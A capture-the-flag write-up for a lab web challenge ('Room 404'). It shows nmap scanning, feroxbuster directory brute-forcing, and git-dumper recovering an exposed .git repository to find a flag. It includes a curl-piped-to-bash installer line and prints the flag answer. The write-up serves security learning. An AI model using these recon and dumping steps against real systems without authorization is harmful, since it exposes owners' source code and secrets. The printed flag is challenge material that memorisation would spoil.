# Hacker Holidays 2026 - Room 404
Room 404 is a web security challenge. The scenario involves investigating the Byte Lotus hotel's web platform to discover unlisted resources and exposed source code running on non-standard ports.

First, I tried running the NMAP scan for the given IP Address - 10.48.165.71 and it did say 8080 TCP port is open, in which the website is also running.

```
mkdir nmap
nmap -sV -sC -oN nmap/initial 10.48.165.71
```

<img width="940" height="735" alt="image" src="https://github.com/user-attachments/assets/bad1ff56-a144-4144-b62e-9f1b7ebeb03a" />

Why I chose to run these scans is to get more advanced detail than the open and closed ports alone.

By using this information, I opened the website of the Blue Lotus hotel but then the website doesn't have any running toggle buttons.

<img width="1919" height="758" alt="image" src="https://github.com/user-attachments/assets/08c9a53e-95d0-4fe0-abc5-7b96e7e6c1bf" />

I clicked the **reserve a stay** button and it gave the error 404 code.

<img width="1429" height="480" alt="image" src="https://github.com/user-attachments/assets/58f70929-3289-40d1-8afb-3d10a176b27a" />

With a dead end here, I went to the scan we ran and looked into the results of it and found the git repository for this website. Normally, developers would push the code files here, but this move here has exposed it. So, let's try and find what we have here in the manual way.

<img width="1895" height="375" alt="image" src="https://github.com/user-attachments/assets/e7da835e-6722-42d5-a06a-58134602f455" />

So, now I'm going to use Feroxbuster, which is a tool which helps you to find all folders and files of a given website. So, I'm going to install it in my system. After doing so, I'm going to find the wordlist common.txt path, in order to find the version control details of this website.

```
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash
find / -iname "common.txt" 2>/dev/null
```

<img width="1736" height="362" alt="image" src="https://github.com/user-attachments/assets/8d062770-e941-44e6-a308-2c31d6a78909" />

I'm going to run a scan, on the Seclists path as it contains directories with /Discovery/Web-Content, to try and find out all details as we can.

```
feroxbuster -u http://10.48.165.71:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

<img width="1844" height="692" alt="image" src="https://github.com/user-attachments/assets/9afd3644-f0ec-41c6-a557-00b39b23755b" />

By running this, I get the .git/Head folder, so it is there in open for us. So, let's try and dump this git repository using the git dumper tool.

```
pip install git-dumper
git-dumper http://10.48.165.71:8080/.git data
```

I have used the folder name as data to dump all the git repository files in this folder.

<img width="1377" height="695" alt="image" src="https://github.com/user-attachments/assets/122a826f-d986-4c4e-9c49-9fbc07f48e53" />

We've got multiple folders and files by doing this and now I want to see if there are any hidden files in this folder we have created to dump all the details.

```
ls -la data
cat data/README.md
```

<img width="1262" height="484" alt="image" src="https://github.com/user-attachments/assets/f5979105-4138-49ce-93fc-01c8eb8a498a" />

By doing so, we found the flag for this room.

**What is the flag?** <br>
THM{byt3_l0tus_n3v3r_f0rg3ts}

## Lessons Learned

* **Exposed Version Control Repositories:** Developers often accidentally ship exposed `.git` directories to production, allowing attackers to reconstruct and download the entire website source code using tools like `git-dumper`.
* **Fuzzing Hidden Directories:** Performing directory brute-forcing with tools like `feroxbuster` and tailored wordlists (such as SecLists) is essential for uncovering hidden assets, admin panels, or sensitive folder structures not linked on the main site.
* **Inspecting Dumped Code for Secrets:** Reconstructing source repositories often reveals sensitive files like `README.md`, developer notes, or hardcoded credentials that contain critical flags or internal information.






